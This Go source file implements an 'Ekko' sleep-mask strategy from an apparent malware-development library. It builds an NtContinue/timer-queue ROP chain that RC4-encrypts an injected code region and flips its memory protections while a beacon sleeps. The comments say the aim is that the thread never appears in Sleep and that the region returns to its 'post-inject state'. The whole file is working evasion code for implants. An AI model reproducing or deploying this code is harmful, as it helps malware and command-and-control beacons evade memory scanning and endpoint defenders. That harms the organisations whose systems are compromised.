//go:build windows && amd64

package sleepmask

import (
	"context"
	"errors"
	"fmt"
	"runtime"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/win/api"
)

// EkkoStrategy is the L2-full strategy: a faithful port of Peter
// Winter-Smith's Ekko. Six CONTEXTs are crafted so that a chain of
// CreateTimerQueueTimer(NtContinue, &ctxN) diverts the pool thread
// through VirtualProtect(RW), SystemFunction032 (RC4 encrypt),
// WaitForSingleObjectEx (the actual sleep), SystemFunction032
// (decrypt), VirtualProtect(restore), and finally a resume stub that
// signals completion + exits. During the wait, the beacon thread's
// RIP sits inside VirtualProtect or SystemFunction032 or
// WaitForSingleObjectEx — never in Sleep/SleepEx.
//
// Constraints:
//   - windows + amd64 only (plan9 asm resume stub)
//   - Cipher must be *RC4Cipher (chain hardcodes SystemFunction032)
//   - Region size must fit in uint32 (SystemFunction032's USTRING.Length)
//   - runtime.LockOSThread is held during Cycle so the captured CONTEXT
//     corresponds to a stable OS thread
//   - Not safe for concurrent invocation (shared asm-globals feeding the
//     resume stub).
//
// Status: full ROP chain verified end-to-end via
// TestEkkoStrategy_CycleRoundTrip on Win10 amd64. Key design points:
//   - All 7 CONTEXTs + trampolines + USTR pool live in a page-aligned
//     VirtualAlloc'd scratch (16-byte alignment for FXSAVE).
//   - Each gadget's Rsp is placed with 8 KB of padding below it, so
//     the API function's stack grows into empty scratch, never into
//     our metadata. (This was the last bug: SF032's stack frame was
//     clobbering our slot table, breaking subsequent trampolines.)
//   - USTRING struct (ULONG Length, not USHORT) matches the advapi32
//     signature of SystemFunction032.
//   - Single timer kicks off the chain; trampolines drive the 5
//     remaining gadgets without additional timer races.
//   - resumeStub spins-forever after SetEvent (PAUSE/JMP) — can't call
//     ExitThread without corrupting thread-pool callback bookkeeping.
//   - DeleteTimerQueueEx(NULL) is non-blocking to avoid deadlock on
//     the spinning resume thread. One pool worker "leaks" per Cycle.
//   - Final gadget 4 restores the region to PAGE_EXECUTE_READ (the
//     typical post-inject state). Callers whose regions need a
//     different protection should use TimerQueueStrategy or
//     InlineStrategy.
type EkkoStrategy struct{}

// resumeStub is implemented in plan9 asm (strategy_ekko_amd64.s). Its
// address is used as Rip in the final CONTEXT of the chain. Never
// invoke it from Go code — it assumes a non-Go thread and calls
// ExitThread.
func resumeStub()

// Globals captured by the asm resume stub. Assigned before the first
// CreateTimerQueueTimer call of a Cycle.
var (
	ekkoResumeEvent    uintptr
	ekkoProcSetEvent   uintptr
	ekkoProcExitThread uintptr
)

// Scratch layout — a single VirtualAlloc'd RWX region, page-aligned
// (so automatically 16-byte aligned for FXSAVE targets). Shared
// between EkkoStrategy (6 gadgets) and FoliageStrategy (7 gadgets).
//
// CRITICAL: Win32 API functions invoked by NtContinue use the caller's
// Rsp as their stack, growing DOWN from Rsp into lower addresses. If
// any of our metadata (trampolines, slot table, USTRs, key copy) sits
// in that downward-grow range, the function clobbers it mid-chain and
// subsequent trampolines load garbage ctx pointers. The layout below
// places each gadget's Rsp LOW, with only padding below for stack
// growth, and puts ALL read-back-by-chain metadata above the highest
// Rsp so it is never in any stack's downward-grow range.
//
//	+0x0000  (padding — gadget 0's stack grows down into this)
//	+0x2000  gadget 0 shadow frame (16 bytes, Rsp = +0x2008)
//	+0x4000  gadget 1 shadow frame (Rsp = +0x4008)
//	+0x6000  gadget 2 shadow frame (Rsp = +0x6008)
//	+0x8000  gadget 3 shadow frame (Rsp = +0x8008)
//	+0xA000  gadget 4 shadow frame (Rsp = +0xA008)
//	+0xC000  gadget 5 shadow frame (Rsp = +0xC008)
//	+0xE000  gadget 6 shadow frame (Rsp = +0xE008) — Foliage only
//	+0x10000 trampolines          up to 7 × 0x30          = 0x150
//	+0x10160 ctx slot table       up to 7 × 8             = 0x38 (padded to 0x40)
//	+0x101A0 key copy             ≤ 0x40 bytes
//	+0x101E0 USTR pool            32 bytes
//	+0x11000 contexts             8 × 0x500 (ctxMain + up to 7 gadgets) = 0x2800
//	         total scratch = 0x13800 < 128 KB
const (
	ekkoScratchSize = 128 * 1024
	ekkoMaxGadgets  = 7

	ekkoShadowStride  = 0x2000 // huge gap between gadget Rsps so each stack has 8 KB headroom
	ekkoShadowOffset  = 0x2000
	ekkoShadowSlotOff = 0x08 // post-CALL alignment offset within each slot

	ekkoTrampOffset = 0x10000
	ekkoTrampStride = 0x30 // 7 * 0x30 = 0x150; slots start at +0x160 (16-byte-aligned)

	ekkoSlotsOffset = 0x10160 // room for up to 7 slots × 8 bytes (= 0x38, padded to 0x40)

	ekkoKeyCopyOffset = 0x101A0
	ekkoKeyCopyMax    = 0x40

	ekkoUSTROffset = 0x101E0 // dataUSTR + keyUSTR (32 bytes)

	ekkoCtxOffset = 0x11000
	ekkoCtxStride = 0x0500
)

// ekkoLayout holds pointers into the scratch buffer. All pointers
// are page-aligned-derived, so all CONTEXT pointers satisfy FXSAVE's
// 16-byte alignment requirement.
//
// `ctxs` has capacity for up to ekkoMaxGadgets entries; Ekko uses 6,
// Foliage uses 7. Unused slots are harmlessly pre-populated.
type ekkoLayout struct {
	scratch uintptr
	ctxMain *api.Context64
	ctxs    [ekkoMaxGadgets]*api.Context64
}

func newEkkoLayout() (*ekkoLayout, error) {
	addr, err := windows.VirtualAlloc(0, ekkoScratchSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("sleepmask/ekko: VirtualAlloc scratch: %w", err)
	}
	l := &ekkoLayout{scratch: addr}
	l.ctxMain = (*api.Context64)(unsafe.Pointer(addr + ekkoCtxOffset))
	for i := 0; i < ekkoMaxGadgets; i++ {
		l.ctxs[i] = (*api.Context64)(unsafe.Pointer(addr + ekkoCtxOffset + uintptr(i+1)*ekkoCtxStride))
	}
	return l, nil
}

func (l *ekkoLayout) free() {
	windows.VirtualFree(l.scratch, 0, windows.MEM_RELEASE)
}

func (l *ekkoLayout) tramp(i int) uintptr {
	return l.scratch + ekkoTrampOffset + uintptr(i)*ekkoTrampStride
}

func (l *ekkoLayout) slotsBase() uintptr {
	return l.scratch + ekkoSlotsOffset
}

func (l *ekkoLayout) keyCopy() uintptr {
	return l.scratch + ekkoKeyCopyOffset
}

func (l *ekkoLayout) ustrDataPool() uintptr {
	return l.scratch + ekkoUSTROffset
}

func (l *ekkoLayout) ustrKeyPool() uintptr {
	return l.scratch + ekkoUSTROffset + 16
}

// shadowRsp returns the Rsp value for gadget i. Shadow slot base is
// 16-byte aligned; we offset by 8 so the function sees Rsp % 16 == 8
// at entry (post-CALL state expected by the Win64 ABI). The value
// written at the returned Rsp becomes the function's return address.
func (l *ekkoLayout) shadowRsp(i int) uintptr {
	return l.scratch + ekkoShadowOffset + uintptr(i)*ekkoShadowStride + 8
}

// contextControlInteger limits NtContinue to Rip/Rsp/Rbp/segments + GPRs
// (no FP/XSAVE), so a pool thread doesn't inherit the main thread's FXSAVE
// area — that caused crashes during the Ekko debug bring-up.
const contextControlInteger = 0x00100003 // AMD64 | CONTROL | INTEGER

// chainGadget declares one gadget in the NtContinue ROP chain: the Rip
// to jump to and a closure that sets Rcx/Rdx/R8/R9 (nil for gadgets with
// no register args, e.g. resumeStub).
type chainGadget struct {
	rip  uintptr
	tune func(c *api.Context64)
}

// buildChain is the generic ROP-chain assembler shared by EkkoStrategy
// (6 gadgets) and FoliageStrategy (7). It:
//
//   - writes N trampolines (MOVQ slot[i](RIP),CX; MOVQ $NtContinue,AX; JMP AX)
//   - populates the slot table with &ctxs[i]
//   - copies key into scratch, lays out dataUSTR + keyUSTR for SF032
//   - clones ctxMain into each ctxs[i] with CONTEXT_CONTROL|INTEGER flags
//     and patches Rip/Rsp; chains gadget N's return address into
//     trampoline N+1, except the last gadget whose return slot is zeroed
//     (it must never return — typically resumeStub)
//
// ctxMain must already be populated (RtlCaptureContext'd) before calling.
//
// USTR layout is the `USTRING { ULONG Length; ULONG MaximumLength; PVOID
// Buffer; }` expected by advapi32!SystemFunction032 — NOT the USHORT-based
// UNICODE_STRING layout.
func (l *ekkoLayout) buildChain(gadgets []chainGadget, region Region, key []byte) error {
	n := len(gadgets)
	if n < 2 || n > ekkoMaxGadgets {
		return fmt.Errorf("sleepmask/chain: gadget count %d out of range [2, %d]", n, ekkoMaxGadgets)
	}
	if region.Size > 0xFFFFFFFF {
		return fmt.Errorf("sleepmask/chain: region size %d exceeds USTRING.Length max (4 GiB)", region.Size)
	}
	if len(key) > ekkoKeyCopyMax {
		return fmt.Errorf("sleepmask/chain: key size %d exceeds scratch slot %d", len(key), ekkoKeyCopyMax)
	}

	ntContinueAddr := api.ProcNtContinue.Addr()

	for i := 0; i < n; i++ {
		tr := l.tramp(i)
		b := unsafe.Slice((*byte)(unsafe.Pointer(tr)), ekkoTrampStride)
		b[0] = 0x48
		b[1] = 0x8B
		b[2] = 0x0D
		slotAddr := l.slotsBase() + uintptr(i)*8
		rel := int32(int64(slotAddr) - int64(tr+7))
		*(*int32)(unsafe.Pointer(&b[3])) = rel
		b[7] = 0x48
		b[8] = 0xB8
		*(*uint64)(unsafe.Pointer(&b[9])) = uint64(ntContinueAddr)
		b[17] = 0xFF
		b[18] = 0xE0
	}

	slots := unsafe.Slice((*uintptr)(unsafe.Pointer(l.slotsBase())), n)
	for i := 0; i < n; i++ {
		slots[i] = uintptr(unsafe.Pointer(l.ctxs[i]))
	}

	keyBuf := unsafe.Slice((*byte)(unsafe.Pointer(l.keyCopy())), len(key))
	copy(keyBuf, key)

	writeUSTR := func(at uintptr, length uint32, buf uintptr) {
		*(*uint32)(unsafe.Pointer(at)) = length
		*(*uint32)(unsafe.Pointer(at + 4)) = length
		*(*uintptr)(unsafe.Pointer(at + 8)) = buf
	}
	writeUSTR(l.ustrDataPool(), uint32(region.Size), region.Addr)
	writeUSTR(l.ustrKeyPool(), uint32(len(key)), l.keyCopy())

	for i, g := range gadgets {
		c := l.ctxs[i]
		*c = *l.ctxMain
		c.ContextFlags = contextControlInteger
		c.Rip = uint64(g.rip)
		rsp := l.shadowRsp(i)
		if i == n-1 {
			// Last gadget never returns (resumeStub SetEvents + spins).
			*(*uintptr)(unsafe.Pointer(rsp)) = 0
		} else {
			*(*uintptr)(unsafe.Pointer(rsp)) = l.tramp(i + 1)
		}
		c.Rsp = uint64(rsp)
		if g.tune != nil {
			g.tune(c)
		}
	}

	return nil
}

// ekkoGadgets returns the 6-gadget list for the classic Ekko chain:
// VirtualProtect(RW) → SF032 encrypt → WFSE wait → SF032 decrypt →
// VirtualProtect(RX) → resumeStub. PAGE_EXECUTE_READ is hardcoded for the
// restore because gadget 4's R8 must be known at chain-build time — it's
// a by-value arg, not read from origProtectPtr at chain-run time.
func ekkoGadgets(l *ekkoLayout, region Region, d time.Duration, hDummy windows.Handle, origProtectPtr *uint32) []chainGadget {
	return []chainGadget{
		{rip: api.ProcVirtualProtect.Addr(), tune: func(c *api.Context64) {
			c.Rcx = uint64(region.Addr)
			c.Rdx = uint64(region.Size)
			c.R8 = uint64(windows.PAGE_READWRITE)
			c.R9 = uint64(uintptr(unsafe.Pointer(origProtectPtr)))
		}},
		{rip: api.ProcSystemFunction032.Addr(), tune: func(c *api.Context64) {
			c.Rcx = uint64(l.ustrDataPool())
			c.Rdx = uint64(l.ustrKeyPool())
		}},
		{rip: api.ProcWaitForSingleObjectEx.Addr(), tune: func(c *api.Context64) {
			c.Rcx = uint64(hDummy)
			c.Rdx = uint64(d / time.Millisecond)
			c.R8 = 0
		}},
		{rip: api.ProcSystemFunction032.Addr(), tune: func(c *api.Context64) {
			c.Rcx = uint64(l.ustrDataPool())
			c.Rdx = uint64(l.ustrKeyPool())
		}},
		{rip: api.ProcVirtualProtect.Addr(), tune: func(c *api.Context64) {
			c.Rcx = uint64(region.Addr)
			c.Rdx = uint64(region.Size)
			c.R8 = uint64(windows.PAGE_EXECUTE_READ)
			c.R9 = uint64(uintptr(unsafe.Pointer(origProtectPtr)))
		}},
		{rip: resumeStubAddr(), tune: nil},
	}
}

// resumeStubAddr returns the entry PC of the plan9 asm resumeStub. For
// top-level Go funcs the function value holds a pointer to a descriptor
// whose first word is the entry PC.
func resumeStubAddr() uintptr {
	fn := resumeStub
	return **(**uintptr)(unsafe.Pointer(&fn))
}

func (s *EkkoStrategy) Cycle(ctx context.Context, regions []Region, cipher Cipher, key []byte, d time.Duration) error {
	if _, ok := cipher.(*RC4Cipher); !ok {
		return fmt.Errorf("sleepmask/ekko: requires *RC4Cipher cipher, got %T", cipher)
	}
	if len(regions) != 1 {
		return errors.New("sleepmask/ekko: MVP supports exactly one region; multi-region chain is future work")
	}
	region := regions[0]

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	hCompletion, err := windows.CreateEvent(nil, 0, 0, nil)
	if err != nil {
		return fmt.Errorf("sleepmask/ekko: CreateEvent completion: %w", err)
	}
	defer windows.CloseHandle(hCompletion)
	hDummy, err := windows.CreateEvent(nil, 1, 0, nil)
	if err != nil {
		return fmt.Errorf("sleepmask/ekko: CreateEvent dummy: %w", err)
	}
	defer windows.CloseHandle(hDummy)

	// Globals for the asm resume stub — assigned BEFORE timers are
	// scheduled so the pool thread sees populated values.
	ekkoResumeEvent = uintptr(hCompletion)
	ekkoProcSetEvent = api.ProcSetEvent.Addr()
	ekkoProcExitThread = api.ProcExitThread.Addr()

	layout, err := newEkkoLayout()
	if err != nil {
		return err
	}
	defer layout.free()

	// Capture this thread's CPU state into the 16-byte-aligned ctxMain
	// in scratch. RtlCaptureContext uses FXSAVE which faults on any
	// misaligned target.
	api.ProcRtlCaptureContext.Call(uintptr(unsafe.Pointer(layout.ctxMain)))

	var origProtect uint32
	if err := layout.buildChain(ekkoGadgets(layout, region, d, hDummy, &origProtect), region, key); err != nil {
		return err
	}

	r1, _, lastErr := api.ProcCreateTimerQueue.Call()
	if r1 == 0 {
		return fmt.Errorf("sleepmask/ekko: CreateTimerQueue: %w", lastErr)
	}
	hQueue := windows.Handle(r1)

	ntContinueAddr := api.ProcNtContinue.Addr()
	delayMs := uint32(d / time.Millisecond)

	// Schedule a SINGLE timer for gadget 0. The pool thread's NtContinue
	// kicks off the chain; trampolines drive the 5 remaining gadgets
	// without additional timers (which would race on ctx Rsp slots).
	var hTimer windows.Handle
	rc, _, cErr := api.ProcCreateTimerQueueTimer.Call(
		uintptr(unsafe.Pointer(&hTimer)),
		uintptr(hQueue),
		ntContinueAddr,
		uintptr(unsafe.Pointer(layout.ctxs[0])),
		0, // fire immediately
		0, // one-shot
		0, // WT_EXECUTEDEFAULT
	)
	if rc == 0 {
		return fmt.Errorf("sleepmask/ekko: CreateTimerQueueTimer: %w", cErr)
	}

	// Block until the resume stub signals hCompletion, or watchdog
	// fires (delay + 5s grace).
	watchdog := uint32(delayMs + 5000)
	api.ProcWaitForSingleObject.Call(uintptr(hCompletion), uintptr(watchdog))

	// CompletionEvent = NULL → do NOT block waiting for callbacks to
	// finish. We can't wait because resumeStub's thread spins forever
	// (see asm file for why). The thread pool recycles the worker
	// later on its own schedule; this "leaks" one pool worker per Cycle.
	api.ProcDeleteTimerQueueEx.Call(uintptr(hQueue), 0)

	runtime.KeepAlive(key)

	if ctx.Err() != nil {
		return ctx.Err()
	}
	return nil
}
